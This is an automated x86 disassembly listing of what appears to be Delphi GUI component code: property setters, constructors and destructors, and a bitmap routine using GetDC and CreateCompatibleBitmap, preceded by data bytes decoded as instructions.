add [ ebx + esi + 0x40 ] al
inc ebx
jne r-xdata
add [ eax - 0x27ffbaca ] cl
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x2d3cc08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc edx
clc
inc ebx
jne r-xdata
add [ esp + eax * 2 + 0x42 ] dl
add [ eax - 0x5bffbad1 ] ch
cmp eax [ ebp ]
xor [ edx + 0x42 ] al
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ esi + esi ] dh
inc ebp
add [ eax * 2 + 0x44b80042 ] dl
inc edx
add [ esp + eax * 2 + 0x42 ] cl
add [ esp + eax * 2 + 0x42 ] bh
add [ eax + 0x44 ] dl
inc edx
add ah bh
xor [ ebp ] al
int3
dec esp
imul esi [ ebx + 0x74 ] r-xdata
je r-xdata
into
inc ecx
add ah ah
into
inc ecx
add ah cl
fadd [ ecx ]
fcomp st0
inc ecx
add [ eax - 0x31 ] cl
inc ecx
add [ edi + ecx * 8 - 0x2fb7ffbf ] bl
inc ecx
add al ah
rol [ ecx ] 0x1
cmp dl dl
inc ecx
add ah cl
rol [ ecx ] cl
sbb al 0xd6
inc ecx
add [ eax ] bh
salc
inc ecx
add [ eax ] dh
fld [ ecx ]
adc bh 0x41
add [ eax - 0x25 ] al
inc ecx
add [ eax - 0x25 ] dl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc ecx
add [ eax ] dl
inc ebp
add [ eax ] ah
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x2dac0000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ esi + ebp + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
inc ebp
add [ eax ] dh
inc ebp
add [ eax + 0x20000000 ] ah
sub [ ebp ] al
sbb [ edx + 0x42 ] al
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov [ esi ] dh
inc ebp
add al bl
sub_452f38
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4243f4
test bl bl
jle r-xdata
mov edx esi
call sub_45334c
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_452fa8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_423f08
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_453050
sub_452fdc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_452f6c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41b544
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41b6d0
sub_453024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40452c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404174
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_453050
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45334c
mov edx ebx
mov eax esi
call sub_45332c
sub_453078
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_453050
sub_4530a4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_467ec4
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40358c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_424480
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_443ec0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4530fc
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_467eec
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40358c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42449c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_443ec0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_453154
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_423aa8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4532d8
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4531c0
push ebx
push esi
push edi
call sub_40375c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403390
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41b73c
call sub_403390
mov eax [ edi + 0x30 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423af4
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_453210
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_453258
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41b6b0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov edx edi
call sub_452fdc
sub_4532a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_454b48
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_454b8c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_423b78
sub_4532e4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_423dc4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_45334c
sub_45332c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41b4f8
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_423b78
pop esi
pop ebx
retn
sub_45334c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41b7f0
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_453368
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4533d0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45dca4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_4563e4
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_453c78
mov edx ebp
call sub_453cd8
inc eax
je r-xdata
sub_45345c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_45347c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45349c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_4538ec
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_4538ec
sub_453634
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4243b0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_453688
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403390
mov eax [ esi + 0x9c ]
call sub_403390
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_452f38
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d7a0
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_4536d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bd34
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_453784
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4537e4
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4538ec
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_453a24
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_453a84
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_453ae0
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_453b44
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_453784
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_40452c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_404174
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_4537e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_4538dc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_45329c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_453288
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4537e4
sub_4538ec
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453964
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_40452c
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_404174
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41b654
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41b654
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
sub_4539cc
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453a24
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_40452c
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_404174
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453a84
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453ae0
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453b44
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_41b654
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403540
test eax eax
je r-xdata
sub_453ba4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_40452c
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_424000
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_453784
sub_453bf0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_453c18
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4530a4
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4537e4
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_453cac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41d5ac
mov edi eax
mov eax esi
call sub_4566d0
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_453cd8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_453d1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_453d41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d48
retn
sub_453f0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_453f58
push ebx
push esi
push edi
call sub_40375c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41b73c
mov edx eax
mov eax edi
call sub_454b48
mov eax [ edi + 0x50 ]
call sub_403390
mov eax edi
call sub_45421c
mov eax [ edi + 0x4c ]
call sub_403390
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423af4
test bl bl
jle r-xdata
call sub_403390
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403744
sub_453fc4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_454071
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_454ad0
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_454090
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454078
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_454090
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454131
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42d15c
mov eax ebx
call sub_42c63c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_427608
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_42c63c
pop edx
call sub_4279ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454138
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_454154
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
